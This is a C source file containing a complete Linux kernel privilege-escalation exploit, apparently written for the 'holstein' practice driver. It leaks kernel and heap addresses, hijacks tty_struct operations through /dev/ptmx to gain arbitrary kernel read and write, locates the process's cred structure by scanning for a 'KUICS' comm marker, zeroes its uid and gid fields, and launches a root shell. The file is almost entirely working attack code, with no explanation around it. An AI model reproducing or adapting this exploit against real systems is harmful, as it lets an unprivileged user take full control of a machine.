#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/prctl.h>
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define is_error(c, s)          \
    {                           \
        if ((c)) {              \
            perror((s));        \
            exit(EXIT_FAILURE); \
        }                       \
    }

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);        
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

static void save_state() {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

#define AAR_GADGET 0xffffffff816ae679 - 0xffffffff81000000
#define AAW_GADGET 0xffffffff818d9ef8 - 0xffffffff81000000

int fd;
int target_fd;
char buf[0x500];
uint64_t kernel_base;
uint64_t gbuf_addr;

void AAW(uint64_t* dst, unsigned int val){
	uint64_t* fake_ops = buf;
	fake_ops[12] = kernel_base + AAW_GADGET;
	*(uint64_t*)(buf + 0x418) = gbuf_addr;
	write(fd, buf, 0x500);
	ioctl(target_fd, val, dst);
}

unsigned int AAR(uint64_t* src){
	uint64_t* fake_ops = buf;
	fake_ops[12] = kernel_base + AAR_GADGET;
	*(uint64_t*)(buf + 0x418) = gbuf_addr;
	write(fd, buf, 0x500);
	return ioctl(target_fd, 0, src);
}


int main() {
    save_state();
	if (prctl(PR_SET_NAME, "KUICS" ) != 0 ) 
		exit(0);

	fd = open("/dev/holstein", O_RDWR);
	target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
	read(fd, buf, 0x500);
	hexdump(buf, 0x500);
	uint64_t kernel_text = *(uint64_t*)(buf + 0x418);
	kernel_base = kernel_text - 0x0000000001072460;
	printf("[-] kernel base: %p\n", kernel_base);
	gbuf_addr = *(uint64_t*)(buf + 0x438) - 0x438;
	printf("[-] gbuf_addr: %p\n", gbuf_addr);
	gets();
	uint64_t comm_addr = 0x0;
	for(uint64_t addr = gbuf_addr - 0x400000;;addr += 8){
		if(!(addr&0xffff)){
			printf("[-] searching: %p\n", addr);
		}
		//KUIC...
		if(AAR(addr) == 0x4349554b){
			printf("[?] hit: %p\n", addr);
			comm_addr = addr;
			break;
		}
	}

	uint64_t leak1 = (uint64_t)AAR(comm_addr - 0x10);
	printf("[-] leak1: %p\n", leak1);
	uint64_t leak2 = (uint64_t)AAR(comm_addr - 0x10 + 4);
	printf("[-] leak2: %p\n", leak2);
	uint64_t cred_addr = (leak2 << 32)|(leak1);
	printf("[-] cred addr: %p\n", cred_addr);

	for(int i=0; i< 8; i++){
		AAW(cred_addr+4+i*4, 0x0);
	}
	system("/bin/sh");
	//int target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
	//ioctl(target_fd, 0x4141414141414141, 0x4242424242424242);

    return 0;
}
